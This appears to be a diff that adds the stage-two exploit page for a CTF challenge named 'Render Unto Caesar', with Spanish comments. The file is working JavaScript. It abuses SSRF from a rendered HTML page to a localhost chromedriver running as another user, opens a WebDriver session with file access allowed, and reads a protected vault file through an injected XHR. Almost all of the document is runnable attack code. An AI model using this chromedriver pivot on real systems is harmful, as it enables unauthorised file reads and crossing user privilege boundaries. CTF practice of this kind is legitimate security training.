@@ -1,0 +1,40 @@
+<!--
+  Render Unto Caesar (Fluid Attacks CTF 2026) -- ETAPA 2: SSRF pivote de identidad al chromedriver
+  de 'archivist'. El render corre como 'tributum' y no puede leer /opt/archivist/vault (0700).
+  supervisord.conf revela un 2do chromedriver como 'archivist' en HELPER_PORT = 47210 + seed%8,
+  lanzado con --allowed-origins=*. Desde el HTML renderizado (fetch same-process) creamos una sesion
+  Chrome COMO archivist (JSON Wire), navegamos a file:///opt/archivist/vault/ y leemos con XHR.
+  Ajustar HELPER_PORT al valor real (leido del supervisord.conf en la etapa 1).
+-->
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<pre id="out">[*] SSRF -> chromedriver archivist</pre>
+<script>
+(async () => {
+  const out = document.getElementById("out");
+  const DRV = "http://127.0.0.1:47211";                 // <- HELPER_PORT real
+  const VAULT = "file:///opt/archivist/vault/";          // dir del recibo objetivo
+  try {
+    // 1) abrir sesion Chrome como archivist
+    let r = await fetch(DRV + "/session", {
+      method: "POST", headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({capabilities:{alwaysMatch:{"goog:chromeOptions":{args:["--allow-file-access-from-files"]}}}})
+    });
+    const sid = (await r.json()).value.sessionId;
+    // 2) navegar al vault de archivist
+    await fetch(`${DRV}/session/${sid}/url`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({url: VAULT})
+    });
+    // 3) leer el recibo con XHR desde esa sesion (permisos de archivist)
+    r = await fetch(`${DRV}/session/${sid}/execute/sync`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        script: "var x=new XMLHttpRequest();x.open('GET','file:///opt/archivist/vault/receipt.dat',false);x.send();return x.responseText;",
+        args: []
+      })
+    });
+    out.textContent = JSON.stringify(await r.json(), null, 2);
+  } catch (e) { out.textContent = "ERR: " + e; }
+})();
+</script>
+</body></html>
